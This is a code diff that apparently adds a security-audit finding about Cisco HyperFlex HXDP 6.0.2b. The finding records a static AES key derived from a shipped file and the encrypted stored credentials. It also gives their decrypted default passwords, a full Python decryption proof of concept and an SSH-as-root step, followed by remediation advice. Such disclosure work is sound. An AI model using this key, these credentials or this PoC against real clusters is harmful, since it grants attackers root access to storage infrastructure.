@@ -8039,10 +8039,105 @@ HX_F138 = {
     ),
 }
 
+HX_F139 = {
+    "id": "HX-F139",
+    "title": (
+        "HyperFlex HXDP 6.0.2b storfs-misc — Predictable AES Key Derived from Shipped Firmware File "
+        "Decrypts Stored Credentials Including Default ctlVM Root Password"
+    ),
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "cwe": "CWE-321",
+    "versions_affected": "6.0.2b (confirmed); all versions shipping storfs-misc with Secret.class",
+    "component": "storfs-misc package (springpath_env_parse.py + Secret.class + springpath_default.tunes)",
+    "description": (
+        "HXDP uses AES-CBC encryption to store cluster credentials in *.tunes config files. "
+        "The AES key is derived as MD5(Secret.class), where Secret.class ships inside the "
+        "storfs-misc firmware package. Secret.class is a Java class file containing a static "
+        "long field (secreteKey = 4346757647632874372L) compiled from Test.java and deployed "
+        "under the misleading name Secret.class — an attempt at obscurity that provides no "
+        "actual key protection.\n\n"
+        "The effective AES-256 key for all HXDP 6.0.2b installations is:\n"
+        "  md5sum Secret.class = 1f6d13bcd7753f2d3b2e2da361b7afb5\n\n"
+        "springpath_default.tunes (also shipped in storfs-misc) contains encrypted credentials "
+        "in the [credentials] section:\n"
+        "  stctl_vm_passwd  = DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU=\n"
+        "  installer_passwd = DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU=\n"
+        "  ssl_cert_passwd  = yWK4pTIUEr0TCjpQdp9sb/KW404x6Id/6ImlCOWdG7s=\n\n"
+        "Decrypting with the derived key:\n"
+        "  stctl_vm_passwd  → 'Cisco123'\n"
+        "  installer_passwd → 'Cisco123'\n"
+        "  ssl_cert_passwd  → 'springpath'\n\n"
+        "stctl_vm_passwd is the root password for the Storage Controller VM (ctlVM), the "
+        "management and data-plane core of every HyperFlex node. installer_passwd is used "
+        "during HX cluster deployment. ssl_cert_passwd protects the SSL keystore.\n\n"
+        "Key derivation code (springpath_env_parse.py):\n"
+        "  def md5(fname):\n"
+        "      hash_md5 = hashlib.md5()\n"
+        "      with open(fname, 'rb') as f:\n"
+        "          for chunk in iter(lambda: f.read(4096), b''):\n"
+        "              hash_md5.update(chunk)\n"
+        "      return hash_md5.hexdigest()\n\n"
+        "  def decrypt(key, enc):\n"
+        "      enc = base64.b64decode(enc)\n"
+        "      iv = enc[:16]\n"
+        "      cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, iv)\n"
+        "      return unpad(cipher.decrypt(enc[16:]))\n\n"
+        "  file_md5 = md5('/usr/share/hyperflex/storfs-misc/Secret.class')\n"
+        "  decoded = decrypt(file_md5, value)  # file_md5 is the AES key\n\n"
+        "Attack path: firmware download (public) → md5sum Secret.class → derive key → "
+        "decrypt any HXDP tunes file containing stored credentials. "
+        "Deployments using default credentials (stctl_vm_passwd unchanged at 'Cisco123') "
+        "expose ctlVM root to any attacker with network access to the ctlVM SSH port (22)."
+    ),
+    "proof_of_concept": (
+        "# Full decryption PoC\n"
+        "import hashlib, base64\n"
+        "from Crypto.Cipher import AES\n\n"
+        "def md5_file(path):\n"
+        "    h = hashlib.md5()\n"
+        "    with open(path, 'rb') as f:\n"
+        "        for chunk in iter(lambda: f.read(4096), b''):\n"
+        "            h.update(chunk)\n"
+        "    return h.hexdigest()\n\n"
+        "def unpad(s): return s[:-ord(s[len(s)-1:])]\n\n"
+        "def decrypt(key, enc):\n"
+        "    enc = base64.b64decode(enc)\n"
+        "    iv = enc[:16]\n"
+        "    cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, iv)\n"
+        "    return unpad(cipher.decrypt(enc[16:]))\n\n"
+        "key = md5_file('/usr/share/hyperflex/storfs-misc/Secret.class')\n"
+        "# key = '1f6d13bcd7753f2d3b2e2da361b7afb5'  (static across all 6.0.2b installs)\n\n"
+        "print(decrypt(key, 'DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU='))  # Cisco123\n"
+        "print(decrypt(key, 'yWK4pTIUEr0TCjpQdp9sb/KW404x6Id/6ImlCOWdG7s='))  # springpath\n\n"
+        "# SSH to ctlVM with decrypted default password\n"
+        "# ssh root@<ctlvm_ip>  # password: Cisco123"
+    ),
+    "files": [
+        "/usr/share/hyperflex/storfs-misc/Secret.class",
+        "/usr/share/hyperflex/storfs-misc/springpath_default.tunes",
+        "/opt/hyperflex/storfs-factory/utils/springpath_env_parse.py",
+    ],
+    "remediation": (
+        "1. Replace MD5(Secret.class) key derivation with a properly seeded per-installation "
+        "   secret (e.g., PBKDF2 with per-node salt generated at first boot, stored in "
+        "   a hardware-backed keystore or TPM).\n"
+        "2. Remove Secret.class from the firmware distribution package; key material must "
+        "   never ship alongside ciphertext.\n"
+        "3. Rotate all credentials currently stored in *.tunes files; the 6.0.2b default "
+        "   key is now known.\n"
+        "4. Enforce mandatory credential rotation during initial cluster deployment; reject "
+        "   'Cisco123' as stctl_vm_passwd at the UI layer.\n"
+        "5. Restrict ctlVM SSH (port 22) to the storage management network; prevent access "
+        "   from the ESXi management VLAN."
+    ),
+}
+
 for _f in [
     HX_F120, HX_F121, HX_F122, HX_F123, HX_F124, HX_F125, HX_F126,
     HX_F127, HX_F128, HX_F129, HX_F130, HX_F131, HX_F132, HX_F133, HX_F134,
-    HX_F135, HX_F136, HX_F137, HX_F138,
+    HX_F135, HX_F136, HX_F137, HX_F138, HX_F139,
 ]:
     FINDINGS[_f["id"]] = _f
 
